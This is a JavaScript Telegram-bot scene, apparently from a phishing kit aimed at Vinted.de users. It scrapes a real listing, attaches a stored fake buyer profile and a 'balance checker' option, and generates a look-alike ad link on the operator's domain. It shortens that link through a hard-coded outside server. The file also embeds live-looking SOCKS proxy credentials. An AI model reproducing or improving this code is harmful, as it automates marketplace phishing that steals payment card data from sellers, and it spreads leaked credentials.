const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const vinted_de_domains = ["www.vinted.de", "vinted.de"];
const SocksProxyAgent = require("socks-proxy-agent");
const torProxyAgent = new SocksProxyAgent('socks://rnedcertific:55583jdBQv@45.10.156.78:51524')

const scene = new WizardScene(
  "create_link_vinted_de",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "vinted_de",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки VINTED.DE");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление VINTED.DE", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!vinted_de_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление VINTED.DE")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }

      log(ctx, `отправил ссылку для парсинга BA (${url.href})`);

      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
     const ad = await axios.get(encodeURI(url.href));
const $ = cheerio.load(ad.data);

const info = {
  title: null,
  price: null,
  adLink: url.href,
  photo: null,
};

try {
  // 🏷️ Заголовок
  const titleElement = $('h1.web_ui__Text__title').first();
  if (titleElement.length) {
    info.title = titleElement.text().trim();
  }

  // 💰 Цена
  const priceElement = $('div[data-testid="item-price"] p.web_ui__Text__subtitle').first();
  if (priceElement.length) {
    info.price = priceElement.text().replace(/\s+/g, "").trim();
  }

  // 🖼️ Фото — ищем <img> внутри блока с data-testid
  const imgElement = $('div[data-testid^="item-photo-"] img[data-testid$="--img"]').first();
  if (imgElement.length) {
    info.photo = imgElement.attr("src")?.trim();
  }

} catch (err) {
  console.error("Ошибка при парсинге данных:", err);
}

      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        console.log(info);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление VINTED.DE (${url.href})`);
      ctx.scene.state.data = info;

      const profiles = await Profiles.findAll({
        where: { userId: ctx.from.id },
      });

      var buttons = profiles.map((v) => [Markup.callbackButton(v.title, v.id)]);

      await ctx.scene.reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const profiles = await Profiles.findOne({
        where: { id: ctx.callbackQuery.data },
      });

      ctx.scene.state.data.address = profiles.address;
      ctx.scene.state.data.name = profiles.name;
      ctx.scene.state.data.phone = profiles.phone;

      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "vinted_de",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "vinted_de",
      });

      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );
      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === 'ECONNABORTED') {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback 
      }

      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную 
      });

      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`);

      // Собираем сообщение 
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
      }
      ctx.updateType = "message";
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

module.exports = scene;
